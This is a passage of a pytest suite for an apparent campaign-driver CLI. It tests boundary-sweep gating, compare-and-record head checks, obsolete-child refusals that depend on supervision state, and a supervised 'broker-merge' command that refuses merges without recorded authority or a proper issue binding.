        pending = [e["transition_id"] for e in after["advisory_deliveries"]
                   if e["state"] == "pending"]
        emitted = {e["transition_id"] for e in after["advisory_deliveries"]
                   if e["state"] == "emitted"}
        # Keyed on the BOUNDARY (campaign + next child), not the generation — Step-11 F5: a
        # generation key let `handoff` and `next-child` each speak for the same boundary.
        assert [t for t in pending if t not in emitted] == ["bnd:epic-667:612"]
        assert rc in (0, 1), "advisory-only: a failed advisory never becomes the command's verdict"


class TestBoundarySweepCommands:
    """#769 — the child-boundary learnings sweep: three subcommands and the rc-8 gate."""

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    @staticmethod
    def _opted_in(tmp_path, **over):
        """A campaign that has ADOPTED the sweep contract (the key is present)."""
        over.setdefault("boundary_sweeps", [])
        return _state(tmp_path, **over)

    def _head(self, tmp_path):
        _work, head = _local_repo_with_origin(tmp_path)
        return head

    # ---------------------------------------------------------------- begin
    def test_sweep_begin_prints_the_head_as_JSON_on_stdout(self, tmp_path, capsys):
        work, head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["sweep", "begin", "--project-root", work])
        out = capsys.readouterr().out
        assert rc == 0
        assert json.loads(out) == {"head": head}, "stdout is machine-readable"

    # --------------------------------------------------------------- record
    def test_sweep_record_writes_a_record_and_reports_recorded(self, tmp_path, capsys):
        state = self._opted_in(tmp_path)
        work, head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                      "--expected-head", head, "--after-issue", "611",
                      "--learnings", "#611 moved the boundary prose",
                      "--assess", json.dumps({"issue": 612, "outcome": "unaffected",
                                              "note": "unrelated to the prose"})])
        assert rc == 0
        assert json.loads(capsys.readouterr().out)["result"] == "recorded"
        after = json.loads(state.read_text(encoding="utf-8"))
        assert len(after["boundary_sweeps"]) == 1
        assert after["boundary_sweeps"][0]["after_issue"] == 611

    def test_an_exact_replay_reports_replayed_and_does_not_append(self, tmp_path, capsys):
        state = self._opted_in(tmp_path)
        work, head = _local_repo_with_origin(tmp_path)
        argv = ["sweep", "record", "--driver-state", str(state), "--project-root", work,
                "--expected-head", head, "--after-issue", "611", "--learnings", "x",
                "--assess", json.dumps({"issue": 612, "outcome": "unaffected", "note": "n"})]
        assert ll.main(argv) == 0
        capsys.readouterr()
        assert ll.main(argv) == 0
        assert json.loads(capsys.readouterr().out)["result"] == "replayed", \
            "a caller that cannot tell a replay from a fresh write cannot tell a no-op boundary"
        assert len(json.loads(state.read_text(encoding="utf-8"))["boundary_sweeps"]) == 1

    def test_omitting_after_issue_records_null_for_a_no_completion_head_move(
            self, tmp_path, capsys):
        state = self._opted_in(tmp_path)
        work, head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                      "--expected-head", head,
                      "--learnings", "main moved via an unplanned blocker fix; nothing completed",
                      "--assess", json.dumps({"issue": 612, "outcome": "unaffected", "note": "n"})])
        assert rc == 0
        after = json.loads(state.read_text(encoding="utf-8"))
        assert after["boundary_sweeps"][0]["after_issue"] is None

    def test_the_literal_string_null_is_rejected_rather_than_read_as_the_null_case(
            self, tmp_path):
        state = self._opted_in(tmp_path)
        work, head = _local_repo_with_origin(tmp_path)
        assert ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                        "--expected-head", head, "--after-issue", "null", "--learnings", "x",
                        "--assess", json.dumps({"issue": 612, "outcome": "unaffected",
                                                "note": "n"})]) == 2

    def test_a_moved_head_refuses_the_write_instead_of_stamping_stale_assessments(
            self, tmp_path):
        """The compare-and-record property. Observing at write time would have accepted this."""
        state = self._opted_in(tmp_path)
        work, _head = _local_repo_with_origin(tmp_path)
        stale = "c" * 40
        rc = ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                      "--expected-head", stale, "--after-issue", "611", "--learnings", "x",
                      "--assess", json.dumps({"issue": 612, "outcome": "unaffected", "note": "n"})])
        assert rc == 9
        assert json.loads(state.read_text(encoding="utf-8"))["boundary_sweeps"] == [], \
            "a refused record writes nothing"

    def test_incomplete_coverage_is_refused_and_writes_nothing(self, tmp_path):
        state = self._opted_in(tmp_path, issues=[{"number": 611, "status": "merged"},
                                                 {"number": 612, "status": "queued"},
                                                 {"number": 613, "status": "queued"}])
        work, head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                      "--expected-head", head, "--after-issue", "611", "--learnings", "x",
                      "--assess", json.dumps({"issue": 612, "outcome": "unaffected", "note": "n"})])
        assert rc == 2
        assert json.loads(state.read_text(encoding="utf-8"))["boundary_sweeps"] == []

    def test_a_malformed_assess_payload_is_a_caller_error_not_a_crash(self, tmp_path):
        state = self._opted_in(tmp_path)
        work, head = _local_repo_with_origin(tmp_path)
        for bad in ("not json", "[]", '{"issue": "x"}', "null"):
            assert ll.main(["sweep", "record", "--driver-state", str(state),
                            "--project-root", work, "--expected-head", head,
                            "--after-issue", "611", "--learnings", "x", "--assess", bad]) == 2

    # --------------------------------------------------------------- status
    def test_sweep_status_reports_missing_then_swept(self, tmp_path, capsys):
        state = self._opted_in(tmp_path)
        work, head = _local_repo_with_origin(tmp_path)
        assert ll.main(["sweep", "status", "--driver-state", str(state),
                        "--project-root", work]) == 3
        assert json.loads(capsys.readouterr().out)["status"] == "missing"
        ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                 "--expected-head", head, "--after-issue", "611", "--learnings", "x",
                 "--assess", json.dumps({"issue": 612, "outcome": "unaffected", "note": "n"})])
        capsys.readouterr()
        assert ll.main(["sweep", "status", "--driver-state", str(state),
                        "--project-root", work]) == 0
        assert json.loads(capsys.readouterr().out)["status"] == "swept"

    # ----------------------------------------------------------- the rc-8 gate
    def test_next_child_refuses_with_rc_8_when_the_boundary_is_unswept(self, tmp_path, capsys):
        state = self._opted_in(tmp_path)
        work, _head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        streams = capsys.readouterr()
        assert rc == 8
        assert json.loads(streams.out)["status"] == "missing", "stdout stays parseable JSON"
        assert "sweep record" in streams.err, "the refusal must name the command that clears it"

    def test_next_child_proceeds_once_the_sweep_is_recorded(self, tmp_path, capsys):
        state = self._opted_in(tmp_path)
        work, head = _local_repo_with_origin(tmp_path)
        ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                 "--expected-head", head, "--after-issue", "611", "--learnings", "x",
                 "--assess", json.dumps({"issue": 612, "outcome": "unaffected", "note": "n"})])
        capsys.readouterr()
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        assert rc == 0
        assert json.loads(capsys.readouterr().out)["next_issue"] == 612

    def test_a_grandfathered_campaign_is_NOT_gated(self, tmp_path, capsys):
        """Every campaign in flight at upgrade has no sweep key; refusing them would be a
        regression over a boundary already past."""
        state = _state(tmp_path)                       # no boundary_sweeps key
        work, _head = _local_repo_with_origin(tmp_path)
        assert ll.main(["next-child", "--driver-state", str(state), "--project-root", work]) == 0
        assert json.loads(capsys.readouterr().out)["next_issue"] == 612

    def test_an_unreadable_sweep_field_refuses_with_the_REPAIR_message_not_the_sweep_one(
            self, tmp_path, capsys):
        state = self._opted_in(tmp_path, boundary_sweeps="corrupt")
        work, _head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        streams = capsys.readouterr()
        assert rc == 8
        assert json.loads(streams.out)["status"] == "unreadable"
        assert "repair" in streams.err.lower()
        assert "sweep record" not in streams.err, \
            "an unreadable field is NOT self-clearable; saying so would send the run in a loop"

    def test_a_finished_campaign_reports_nothing_ready_rather_than_demanding_a_sweep(
            self, tmp_path, capsys):
        state = self._opted_in(tmp_path, issues=[{"number": 611, "status": "merged"},
                                                 {"number": 612, "status": "merged"}])
        work, _head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        assert rc == 3, "the sweep gate must sit AFTER the not-ready check"
        assert "sweep" not in capsys.readouterr().err.lower()

    def test_the_documented_three_command_sequence_runs_end_to_end(self, tmp_path, capsys):
        """The Step-4 pass-3 CRITICAL was a broken copy-pasteable example: the doc assigned
        `sweep begin`'s whole stdout to --expected-head, which is JSON, not a sha. The published
        sequence is therefore under test."""
        state = self._opted_in(tmp_path)
        work, _head = _local_repo_with_origin(tmp_path)
        assert ll.main(["sweep", "begin", "--project-root", work]) == 0
        head = json.loads(capsys.readouterr().out)["head"]        # <- the extraction step
        assert ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                        "--expected-head", head, "--after-issue", "611", "--learnings", "x",
                        "--assess", json.dumps({"issue": 612, "outcome": "unaffected",
                                                "note": "n"})]) == 0
        capsys.readouterr()
        assert ll.main(["sweep", "status", "--driver-state", str(state),
                        "--project-root", work]) == 0
        assert json.loads(capsys.readouterr().out)["status"] == "swept"


class TestBoundarySweepReviewFixes:
    """Step-11 findings on #769, each with the property it protects."""

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    def test_campaign_creation_SEEDS_the_sweep_contract(self, tmp_path, monkeypatch):
        """Without production seeding every NEW campaign inherits the migration exemption meant
        for campaigns already in flight, and the gate never fires for anybody."""
        work, _head = _local_repo_with_origin(tmp_path)
        state = tmp_path / "fresh-campaign.json"
        state.write_text(json.dumps({"campaign": "epic-new", "project": PROJECT,
                                     "issues": [{"number": 1, "status": "queued"}]}),
                         encoding="utf-8")
        monkeypatch.setattr(ll, "resolve_creation_transport", lambda **k: ("inline", "probed"))
        assert ll.main(["transport", "resolve-creation", "--driver-state", str(state),
                        "--project-root", work]) == 0
        after = json.loads(state.read_text(encoding="utf-8"))
        assert after["boundary_sweeps"] == [], "a new campaign must be gated, not grandfathered"

    def test_a_head_that_moves_before_the_LOCK_refuses_and_writes_nothing(self, tmp_path,
                                                                         monkeypatch):
        """Comparing before acquiring the lock leaves a window in which the head moves and the
        record is appended anyway — the exact staleness compare-and-record promises to refuse."""
        state = _state(tmp_path, boundary_sweeps=[])
        work, head = _local_repo_with_origin(tmp_path)
        calls = {"n": 0}
        real = ll.observe_head

        def _moving(root, **kw):
            calls["n"] += 1
            return real(root, **kw) if calls["n"] == 1 else "f" * 40

        monkeypatch.setattr(ll, "observe_head", _moving)
        rc = ll.main(["sweep", "record", "--driver-state", str(state), "--project-root", work,
                      "--expected-head", head, "--after-issue", "611", "--learnings", "x",
                      "--assess", json.dumps({"issue": 612, "outcome": "unaffected", "note": "n"})])
        assert rc == 9
        assert json.loads(state.read_text(encoding="utf-8"))["boundary_sweeps"] == []

    def test_the_unreadable_refusal_says_RESET_and_never_says_delete(self, tmp_path, capsys):
        """The first draft's repair text told operators to DELETE the key — which grandfathers the
        campaign and disarms the gate permanently, turning the documented repair into a bypass."""
        state = _state(tmp_path, boundary_sweeps="corrupt")
        work, _head = _local_repo_with_origin(tmp_path)
        assert ll.main(["next-child", "--driver-state", str(state), "--project-root", work]) == 8
        err = capsys.readouterr().err.lower()
        assert "reset" in err and '"boundary_sweeps": []' in err
        assert "delete the malformed" not in err
        assert "disarms the gate" in err, "the reason must travel with the instruction"


# --------------------------------------------------------------------------- #
# #944 Task 9 — workspace-root walk-up and the supervision view it feeds
# --------------------------------------------------------------------------- #

class TestFindWorkspaceRoot:
    def test_found_at_the_start_dir_itself(self, tmp_path):
        (tmp_path / ".rawgentic_workspace.json").write_text("{}", encoding="utf-8")
        assert ll._find_workspace_root(str(tmp_path)) == os.path.realpath(str(tmp_path))

    def test_found_several_levels_up(self, tmp_path):
        (tmp_path / ".rawgentic_workspace.json").write_text("{}", encoding="utf-8")
        nested = tmp_path / "a" / "b" / "c"
        nested.mkdir(parents=True)
        assert ll._find_workspace_root(str(nested)) == os.path.realpath(str(tmp_path))

    def test_not_found_anywhere_up_returns_none(self, tmp_path):
        nested = tmp_path / "a" / "b"
        nested.mkdir(parents=True)
        assert ll._find_workspace_root(str(nested)) is None


class TestSupervisionViewFor:
    def test_no_workspace_present_defaults_to_attended(self, tmp_path):
        nested = tmp_path / "a" / "b"
        nested.mkdir(parents=True)
        view = ll._supervision_view_for(str(nested))
        assert view.state == "attended"

    def test_a_malformed_state_file_does_not_raise_and_stays_attended(self, tmp_path):
        """Reuses `supervision_lib`'s own never-raises guarantee rather than merely citing it
        (#944 Task 9's own trap note) — a genuinely malformed file must exercise that path,
        not a synthetic stand-in for it."""
        (tmp_path / ".rawgentic_workspace.json").write_text("{}", encoding="utf-8")
        sup_dir = tmp_path / "claude_docs"
        sup_dir.mkdir()
        (sup_dir / ".supervision.json").write_text("{not json", encoding="utf-8")
        view = ll._supervision_view_for(str(tmp_path))
        assert view.state == "attended"
        assert view.load_status == "invalid"


# --------------------------------------------------------------------------- #
# #944 Task 10 — the obsolete-child owner gate, composed into next-child/handoff
# --------------------------------------------------------------------------- #

def _declare_supervision(workspace_root, state, *, until=None):
    """Hand-rolled `.supervision.json`, matching `supervision_lib`'s schema — same convention as
    `_armed` hand-rolling a revalidation receipt rather than calling the write-side admin CLI."""
    Path(workspace_root, ".rawgentic_workspace.json").write_text("{}", encoding="utf-8")
    sup_dir = Path(workspace_root, "claude_docs")
    sup_dir.mkdir(parents=True, exist_ok=True)
    record = {"schema_version": 1, "revision": 1, "state": state, "until": until,
             "declared_at": "2026-08-01T00:00:00Z", "declared_by_session": "s1"}
    (sup_dir / ".supervision.json").write_text(json.dumps(record), encoding="utf-8")


def _pending_state(tmp_path, *, dependent=False, boundary_sweeps=None):
    """A campaign whose only ready child (612) carries `pending_disposition` — the selection
    layer must refuse it (#944 Task 7), never pick it. `dependent=True` adds 613, which depends
    on 612 and is not yet terminal, so `has_pending_dependents` reads True."""
    work, head = _local_repo_with_origin(tmp_path)
    issues = [{"number": 611, "status": "merged"}, {"number": 612, "status": "queued"}]
    if dependent:
        issues.append({"number": 613, "status": "queued", "depends_on": [612]})
    state = {"campaign": "epic-944t10", "epic": 944, "project": PROJECT,
             "session_mode": "fresh-session", "issues": issues}
    if boundary_sweeps is not None:
        state["boundary_sweeps"] = boundary_sweeps
    _armed(state, head)
    rec = state["queue_revalidation"]["children"]["612"]
    rec["pending_disposition"] = "issue_obsolete"
    rec["outcome"] = None
    p = tmp_path / "driver-state.json"
    p.write_text(json.dumps(state), encoding="utf-8")
    return p, work


class TestObsoletePendingGate:
    """#944 Task 10 — rc 11 on both `next-child` and `handoff`, behind the self-clearing gates
    (sweep, in-flight) per design §2.3, text branching on supervision state per §2.4, and never
    claiming automatic continuation (Step-4 review round 2 finding 6 partially overturns D256)."""

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    def test_next_child_refuses_rc_11_and_names_the_remedy_when_attended(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path)
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        captured = capsys.readouterr()
        assert rc == 11
        out = json.loads(captured.out)
        assert out["outcome"] == "obsolete_pending"
        assert out["issue"] == 612
        assert out["has_pending_dependents"] is False
        assert "record-child-outcome --issue 612" in captured.err
        assert "ask the owner" in captured.err.lower()

    def test_next_child_remedy_is_shell_safe_and_names_the_real_driver_state(
            self, tmp_path, capsys):
        """Step-8a review finding 5: the old text printed ONE line with UNQUOTED `|`
        characters — an ordinary shell interprets them as a pipeline, so the printed remedy was
        not actually copy-pasteable — and omitted `--driver-state` entirely, so even a
        hand-corrected command could act on the wrong campaign."""
        state, work = _pending_state(tmp_path)
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        captured = capsys.readouterr()
        assert rc == 11
        err = captured.err
        assert "|" not in err, "an unquoted pipe breaks an ordinary shell"
        assert "--driver-state" in err and str(state) in err
        for status in ("deferred", "abandoned", "merged"):
            assert f"--status {status}" in err

    def test_next_child_sleeping_no_dependents_is_recommendation_only(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path)
        _declare_supervision(tmp_path, "sleeping", until="2099-01-01T00:00:00Z")
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        captured = capsys.readouterr()
        assert rc == 11
        err = captured.err.lower()
        assert "record-child-outcome --issue 612" in captured.err
        assert "recommended" in err
        assert "not executed automatically" in err
        assert "and continues" not in err and "then continues" not in err

    def test_next_child_sleeping_with_dependents_recommends_park(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path, dependent=True)
        _declare_supervision(tmp_path, "sleeping", until="2099-01-01T00:00:00Z")
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        captured = capsys.readouterr()
        assert rc == 11
        out = json.loads(captured.out)
        assert out["has_pending_dependents"] is True
        assert "park" in captured.err.lower()
        # Step 11 review: this branch printed rc 11 with NO remedy command at all, contradicting
        # the rest of the change's own claim that rc 11 names the write-back remedy in every
        # supervision state. Parking is not permanent — a human resolving #612 still runs it.
        assert "record-child-outcome --issue 612" in captured.err

    def test_next_child_attended_overdue_still_asks_the_owner(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path)
        _declare_supervision(tmp_path, "away", until="2020-01-01T00:00:00Z")  # long past -> overdue
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        captured = capsys.readouterr()
        assert rc == 11
        assert "ask the owner" in captured.err.lower()

    def test_next_child_sweep_gate_wins_over_obsolete_pending(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path, boundary_sweeps=[])
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        assert rc == ll.SWEEP_REQUIRED_RC

    def test_handoff_refuses_rc_11_preflight(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path)
        argv = _handoff_argv(state, tmp_path, **{"--project-root": work})
        rc = ll.main(argv)
        captured = capsys.readouterr()
        assert rc == 11
        out = json.loads(captured.out)
        assert out["outcome"] == "obsolete_pending"
        assert out["issue"] == 612
        assert "record-child-outcome --issue 612" in captured.err

    def test_handoff_inflight_gate_wins_over_obsolete_pending(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path)
        argv = _handoff_argv(state, tmp_path, **{
            "--project-root": work, "--inflight-none": False,
            "--inflight": "dispatch:x:running:y"})
        rc = ll.main(argv)
        assert rc == ll.INFLIGHT_REQUIRED_RC

    def test_handoff_sweep_gate_wins_over_obsolete_pending(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path, boundary_sweeps=[])
        argv = _handoff_argv(state, tmp_path, **{"--project-root": work})
        rc = ll.main(argv)
        assert rc == ll.SWEEP_REQUIRED_RC

    def test_handoff_locked_recheck_race_maps_to_the_same_rc_11_payload(
            self, tmp_path, monkeypatch, capsys):
        """#944 Task 8's race: the unlocked preflight read sees a clean queued child, but a
        concurrent write lands `pending_disposition` before `_open_and_claim` takes its lock.
        The locked recheck must refuse with the SAME rc-11 shape as the preflight path (design
        §2.6), not the generic precondition-failure branch."""
        work, head = _local_repo_with_origin(tmp_path)
        state = {"campaign": "epic-944t10race", "epic": 944, "project": PROJECT,
                "session_mode": "fresh-session",
                "issues": [{"number": 611, "status": "merged"},
                           {"number": 612, "status": "queued"}]}
        _armed(state, head)
        state_path = tmp_path / "driver-state.json"
        state_path.write_text(json.dumps(state), encoding="utf-8")

        real_update = ll._locked_state_update

        def _race(path, mutator):
            def _mutator_with_race(s):
                rec = s["queue_revalidation"]["children"]["612"]
                rec["pending_disposition"] = "issue_obsolete"
                rec["outcome"] = None
                return mutator(s)
            return real_update(path, _mutator_with_race)

        monkeypatch.setattr(ll, "_locked_state_update", _race)
        argv = _handoff_argv(state_path, tmp_path, **{
            "--project-root": work, "--launcher-armed": None,
            "--fresh-launch-supported": None})
        rc = ll.main(argv)
        captured = capsys.readouterr()
        assert rc == 11
        out = json.loads(captured.out)
        assert out["outcome"] == "obsolete_pending"
        assert out["issue"] == 612


class TestAC3WriteBackClearsTheObsoletePendingGate:
    """#944 Task 11, AC3: the remedy every rc-11 message names must ACTUALLY clear the gate on
    the next selection call — the #840 failure mode this AC guards against is a gate whose
    documented remedy cannot really clear it, so the run loops on the identical refusal forever."""

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    def test_the_writeback_clears_the_gate_so_next_child_selects_past_it(self, tmp_path, capsys):
        state, work = _pending_state(tmp_path)

        rc1 = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        first = capsys.readouterr()
        assert rc1 == 11
        assert "record-child-outcome --issue 612 --status deferred" in first.err
        assert f"--driver-state {state}" in first.err

        rc2 = ll.main(["record-child-outcome", "--issue", "612", "--status", "deferred",
                       "--driver-state", str(state), "--project-root", work])
        second = capsys.readouterr()
        assert rc2 == 0, second

        rc3 = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        third = capsys.readouterr()
        # Not 11 again for the SAME child — the write-back genuinely cleared the pending
        # disposition rather than leaving it stuck on repeat (the #840 shape of this failure).
        assert rc3 != 11, third
        assert rc3 == 3
        assert json.loads(third.out)["outcome"] == "blocked", (
            "611 is merged, 612 is now deferred (not merged) — the campaign is neither "
            "complete nor does anything else remain ready, so it must read as blocked, "
            "never silently as 'complete' or as the same obsolete_pending refusal again")


# --------------------------------------------------------------------------- #
# #963 — broker-merge: the supervised merge path
#
# The whole point of the issue: #871's authority/claims core had ZERO live callers, the
# same unreachable-machinery signature that killed the executor (D174). This command is
# that caller. Every test here drives the real handler with a fake runner, so the exact
# argv reaching `gh` is asserted rather than assumed.
# --------------------------------------------------------------------------- #

import argparse                            # noqa: E402
import supervision_admin as _sa            # noqa: E402
import supervision_claims as _sc           # noqa: E402
import supervision_lib as _sl              # noqa: E402
import supervision_telemetry as _stel      # noqa: E402

BROKER_REFUSED_RC = 12
BROKER_PARKED_RC = 13

_MERGED_JSON = json.dumps({"state": "MERGED", "mergeCommit": {"oid": "d5f1683e"}})
_OPEN_JSON = json.dumps({"state": "OPEN", "mergeCommit": None})
_BINDING_JSON = json.dumps({
    "closingIssuesReferences": [{"number": 963}],
    "body": "Closes #963", "title": "feat: thing (#963)"})


class BrokerRunner(Runner):
    """Replays `gh pr merge` and the two `gh pr view --json` reads by field list."""

    def __init__(self, *, merge_rc=0, merge_stdout="", pr_state=_MERGED_JSON,
                 binding=_BINDING_JSON, merge_raises=None):
        super().__init__()
        self.merge_rc = merge_rc
        self.merge_stdout = merge_stdout
        self.pr_state = pr_state
        self.binding = binding
        self.merge_raises = merge_raises
        self.merge_calls = 0

    def __call__(self, argv, timeout=180):
        assert isinstance(argv, list) and all(isinstance(a, str) for a in argv)
        self.calls.append(list(argv))
        joined = " ".join(argv)
        if "pr merge" in joined:
            self.merge_calls += 1
            if self.merge_raises:
                raise self.merge_raises
            return FakeProc(self.merge_rc, self.merge_stdout)
        if "closingIssuesReferences" in joined:
            return FakeProc(0, self.binding)
        if "mergeCommit" in joined:
            return FakeProc(0, self.pr_state)
        return FakeProc(0, "")


def _broker_workspace(tmp_path, *, campaign="epic-963", issue=963,
                      merge_policy=None, declared=None, pr_number=970):
    """A workspace + project root with a campaign whose queue names `issue`."""
    Path(tmp_path, ".rawgentic_workspace.json").write_text("{}", encoding="utf-8")
    Path(tmp_path, ".rawgentic.json").write_text(json.dumps({
        "version": 1, "project": {"name": "p"},
        "repo": {"provider": "github", "fullName": "o/r", "defaultBranch": "main"},
    }), encoding="utf-8")
    state_dir = Path(tmp_path, "claude_docs", ".driver-state")
    state_dir.mkdir(parents=True, exist_ok=True)
    # The REAL driver-state shape (#976 T0). This fixture used to write
    # {"children": [{"issue": N}]}, a shape `driver_lib` never produces and never reads —
    # so every broker test below passed against a schema that does not exist, while
    # `broker_campaign_names_issue` refused every real campaign in production. Real state
    # is top-level `issues: [{"number": N, "status": …, "pr": M}]` (verified against
    # claude_docs/.driver-state/epic-875-stay-small.json and driver_lib.py:844,1077,1348).
    state = {"campaign": campaign, "project": "p",
             "issues": [{"number": issue, "status": "in_progress", "pr": pr_number}]}
    if merge_policy:
        state["policy"] = {"merge_policy": merge_policy}
    (state_dir / f"{campaign}.json").write_text(json.dumps(state), encoding="utf-8")
    if declared:
        _sa.declare(str(tmp_path), state=declared, until=None, session_id="s1",
                    campaign_ids=[], consult_providers=["gpt"], consult_granted=True)
    return str(tmp_path)


def _broker(root, *, runner, pr=970, issue=963, campaign="epic-963", capsys=None):
    """Run the handler; return (rc, parsed stdout JSON or None)."""
    rc = ll._cmd_broker_merge(argparse.Namespace(
        pr=pr, issue=issue, campaign=campaign, project_root=root,
        workspace_root=root, repo=None, runner=runner))
    out = None
    if capsys is not None:
        captured = capsys.readouterr().out.strip().splitlines()
        for line in reversed(captured):
            if line.startswith("{"):
                out = json.loads(line)
                break
    return rc, out


class TestBrokerMergeAuthority:

    def test_an_attended_workspace_merges_through(self, tmp_path, capsys):
        """AC3: attended passes through unchanged — now with execute-once protection."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner()
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == 0
        assert out["status"] == "merged"
        assert out["merge_sha"] == "d5f1683e"
        merge_argv = [a for a in runner.calls if "merge" in " ".join(a)][0]
        assert merge_argv == ["gh", "pr", "merge", "970", "--repo", "o/r",
                              "--squash", "--delete-branch"]

    def test_an_absence_without_a_grant_is_refused_and_never_merges(self, tmp_path, capsys):
        """The truth table's whole point: absence permits a merge ONLY under a recorded
        auto-merge-scoped-to-run grant."""
        root = _broker_workspace(tmp_path, declared="away")
        runner = BrokerRunner()
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert out["status"] == "refused"
        assert runner.merge_calls == 0

    def test_an_absence_WITH_the_recorded_grant_merges(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path, merge_policy="auto-merge-scoped-to-run",
                                 declared="away")
        rc, out = _broker(root, runner=BrokerRunner(), capsys=capsys)
        assert rc == 0
        assert out["status"] == "merged"

    def test_a_deleted_declaration_refuses_even_with_the_grant(self, tmp_path, capsys):
        """#963 AC2 reaching the merge path: the exact hole this issue closes."""
        root = _broker_workspace(tmp_path, merge_policy="auto-merge-scoped-to-run",
                                 declared="away")
        os.unlink(_sl.supervision_path(root))
        runner = BrokerRunner()
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert runner.merge_calls == 0
        assert "declar" in out["reason"].lower()

    def test_a_tightening_override_denies_the_grant(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path, merge_policy="auto-merge-scoped-to-run",
                                 declared="away")
        path = Path(root, "claude_docs", ".driver-state", "epic-963.json")
        state = json.loads(path.read_text())
        state["supervision_override"] = {"mode": "no_merge"}
        path.write_text(json.dumps(state))
        runner = BrokerRunner()
        rc, _out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert runner.merge_calls == 0


class TestBrokerMergeTargetBinding:

    def test_an_issue_outside_the_campaign_is_refused_before_any_authority_read(
            self, tmp_path, capsys):
        """A grant scoped to one campaign must not authorize an unrelated merge."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner()
        rc, out = _broker(root, runner=runner, issue=999, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert out["reason"].startswith("binding")
        assert runner.merge_calls == 0

    def test_a_pr_that_does_not_reference_the_issue_is_refused(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(binding=json.dumps({
            "closingIssuesReferences": [], "body": "unrelated", "title": "other"}))
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert out["reason"].startswith("binding")
        assert runner.merge_calls == 0

    def test_a_Part_of_body_reference_binds(self, tmp_path, capsys):
        """Repo convention: only the LAST PR of a multi-PR child says Closes; the earlier
        ones say 'Part of', which does NOT populate closingIssuesReferences."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(binding=json.dumps({
            "closingIssuesReferences": [],
            "body": "Some prose.\nPart of #963\n", "title": "feat: part one"}))
        rc, _out = _broker(root, runner=runner, capsys=capsys)
        assert rc == 0

    def test_a_quoted_mention_does_not_bind(self, tmp_path, capsys):
        """The match is line-anchored, so a historical or quoted mention is not evidence."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(binding=json.dumps({
            "closingIssuesReferences": [],
            "body": "> we discussed Part of #963 last week", "title": "unrelated"}))
        rc, _out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC

    def test_a_foreign_repo_is_refused(self, tmp_path, capsys):
        """--repo must equal the project's configured canonical repo."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner()
        rc, out = _broker_with_repo(root, runner=runner, repo="someone/else",
                                    capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert runner.merge_calls == 0
        assert "repo" in out["reason"]


def _broker_with_repo(root, *, runner, repo, capsys, pr=970, issue=963,
                      campaign="epic-963"):
    rc = ll._cmd_broker_merge(argparse.Namespace(
        pr=pr, issue=issue, campaign=campaign, project_root=root,
        workspace_root=root, repo=repo, runner=runner))
    out = None
    for line in reversed(capsys.readouterr().out.strip().splitlines()):
        if line.startswith("{"):
            out = json.loads(line)
            break
    return rc, out


class TestBrokerMergeOutcomes:

    def test_a_success_the_probe_cannot_confirm_is_never_recorded_as_merged(
            self, tmp_path, capsys):
        """rc 0 from `gh` is not evidence: the SHA comes from the probe, so an
        unconfirmable success takes the ambiguous path instead of a false 'merged'."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(pr_state=_OPEN_JSON)
